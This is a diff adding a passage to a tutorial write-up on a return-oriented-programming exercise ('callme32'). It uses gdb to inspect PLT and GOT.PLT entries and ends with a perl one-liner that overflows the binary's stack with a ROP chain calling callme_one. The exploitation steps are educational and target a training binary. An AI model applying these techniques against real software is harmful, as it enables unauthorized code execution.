@@ -64,4 +64,65 @@ readelf -S callme32
 ```
 ![](./7.png)
 
+Now, let's take a look at the helper function `usefulFunction` and try to understand how it will assist us and how this relates to the `PLT`.
+
+```
+gdb callme32
+```
+```
+set disassembly-flavor intel
+```
+```
+disass usefulFunction
+```
+![](./8.png)
+
+In the constructed ROP chain, a malicious return to the `usefulFunction` itself won't be beneficial, as it does contain calls to the target functions, but not in the correct order and without the right parameters. Therefore, a malicious return to the call-command for them won't help either, since the call will return to the continuation of execution within `usefulFunction`. Thus, when we call the target functions, we'll use the corresponding address in the `PLT` (highlighted with a green line). Let's take a look at the appropriate entries in the `PLT` table.
+
+```
+x/3i 0x080484f0
+```
+```
+x/3i 0x08048550
+```
+```
+x/3i 0x080484e0
+```
+![](./9.png)
+
+The addresses highlighted with a green line represent the appropriate entries in the `PLT` table. The addresses highlighted with a yellow line indicate the locations where the actual function addresses are located.
+
+If we now look at the `GOT.PLT` (that is, at the addresses highlighted in yellow), we'll find that they have not yet been resolved (which makes sense, as we haven't called them at all yet).
+
+```
+x/wx 0x0804a018
+```
+```
+x/wx 0x0804a030
+```
+```
+x/wx 0x0804a014
+```
+![](./10.png)
+
+The keen-eyed will notice that up to this point, we have essentially reached a complete explanation for the output of the commands `rabin2 -i callme32` and `rabin2 -R callme32` that were executed earlier during the research. The addresses in green correspond to the `PLT` and the addresses in yellow correspond to the `GOT.PLT`.
+
+Now, let's try to build a ROP chain that will call the first function. Since we won't be using the `call` command, we also need to ensure that there's a return address from the first function on the stack.
+
+Thus, the order will be as follows (from the top of the stack and down): 
+* 44 bytes of garbage:
+    * `X`x44
+* the address of `callme_one` function via the `PLT`:
+    * `0x080484f0`
+* some arbitrary return address (currently just garbage):
+    * `YYYY`
+* followed by the first, second, and third parameters:
+    * `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`
+
+So let's exit the debugger (with `q` command) and try the first ROP chain.
+
+```
+perl -e 'print "X"x44 . "\xf0\x84\x04\x08" . "YYYY" . "\xef\xbe\xad\xde" . "\xbe\xba\xfe\xca" . "\x0d\xf0\x0d\xd0" ' | ./callme32
+```
+![](./11.png)
 
